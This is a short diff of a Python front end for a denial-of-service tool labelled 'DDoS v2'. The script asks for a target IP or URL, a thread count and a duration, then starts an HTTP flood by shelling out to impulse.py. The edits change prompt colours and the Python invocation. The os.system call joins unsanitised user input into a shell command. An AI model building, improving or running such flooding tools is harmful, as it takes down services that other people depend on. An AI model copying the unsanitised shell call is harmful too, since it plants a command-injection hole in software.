@@ -13,17 +13,21 @@ logo = """
   DDoS v2                                               
 """
 print(Fore.RED+logo+Fore.WHITE)
-ip = input(Fore.LIGHTWHITE_EX+"  IP/URL: "+Fore.WHITE)
-threadcount = input(Fore.LIGHTWHITE_EX+"  Threads (1-300): "+Fore.WHITE)
-count = input(Fore.LIGHTWHITE_EX+"  Multiplier: "+Fore.WHITE)
-attacktime = input(Fore.LIGHTWHITE_EX+"Time (Seconds) :"+Fore.WHITE)
-cont = input("  Continue?")
+ip = input(Fore.CYAN+"  IP/URL: "+Fore.WHITE)
+threadcount = input(Fore.CYAN+"  Threads (1-300): "+Fore.WHITE)
+count = input(Fore.CYAN+"  Multiplier: "+Fore.WHITE)
+attacktime = input(Fore.CYAN+"  Time (Seconds) :"+Fore.WHITE)
+cont = input(Fore.LIGHTYELLOW_EX+"  Continue?")
 if cont == 'n':
+    os.system("clear")
+    exit()
+if cont == 'N':
+    os.system("clear")
     exit()
 def http():
     print(Fore.LIGHTYELLOW_EX+"  Starting HTTP Attack!")
     time.sleep(2)
-    os.system("python3.9 impulse.py --target "+ip+"  --time "+attacktime+"--threads "+threadcount+" --method HTTP")
+    os.system("python3 impulse.py --target "+ip+"  --time "+attacktime+"--threads "+threadcount+" --method HTTP")
     try:
         """Okehhh"""
     except KeyboardInterrupt:
